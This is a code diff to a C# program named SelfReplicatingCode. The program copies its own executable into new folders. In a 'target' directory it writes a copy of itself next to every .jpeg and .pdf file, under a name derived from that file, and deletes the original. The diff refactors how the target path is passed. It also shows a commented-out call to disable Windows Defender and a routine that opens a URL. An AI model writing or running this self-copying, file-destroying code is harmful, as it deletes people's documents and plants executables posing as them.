@@ -13,7 +13,9 @@ namespace SelfReplicatingCode
         {
             string fileName = Assembly.GetExecutingAssembly().Location;
             string directoryPath = Path.Combine(Path.GetDirectoryName(fileName), "generated-files");
+
             string[] targetExtensions = {".jpeg",".pdf"};
+            string targetDirectoryPath = Path.Combine(Path.GetDirectoryName(fileName), "target");
 
             // create the directory if it doesn't exist
             if (!Directory.Exists(directoryPath))
@@ -28,7 +30,7 @@ namespace SelfReplicatingCode
                 File.Copy(fileName, newFileName, true);
             }
 
-            TargetExtensions(fileName, targetExtensions); 
+            TargetExtensions(fileName, targetDirectoryPath, targetExtensions); 
 
             // DisableWindowsDefender(); // Disable Windows Defender
 
@@ -89,17 +91,15 @@ namespace SelfReplicatingCode
             System.Diagnostics.Process.Start(url);
         }
 
-        static void TargetExtensions(string fileName, string[] targetExtensions)
+        static void TargetExtensions(string fileName, string targetDirectoryPath, string[] targetExtensions)
         {
-            string directoryPath = Path.Combine(Path.GetDirectoryName(fileName), "target");
-           
             // Copy the file to all files with the target extension
             foreach (string extension in targetExtensions){
-                foreach (string targetFile in Directory.GetFiles(directoryPath, "*" + extension))
+                foreach (string targetFile in Directory.GetFiles(targetDirectoryPath, "*" + extension))
                 {
-                    string newFileName = Path.Combine(directoryPath, targetFile + Path.GetExtension(fileName));
+                    string newFileName = Path.Combine(targetDirectoryPath, targetFile + Path.GetExtension(fileName));
                     File.Copy(fileName, newFileName, true);
-                    File.Delete(Path.Combine(directoryPath, targetFile));
+                    File.Delete(Path.Combine(targetDirectoryPath, targetFile));
                 }
             }
         }
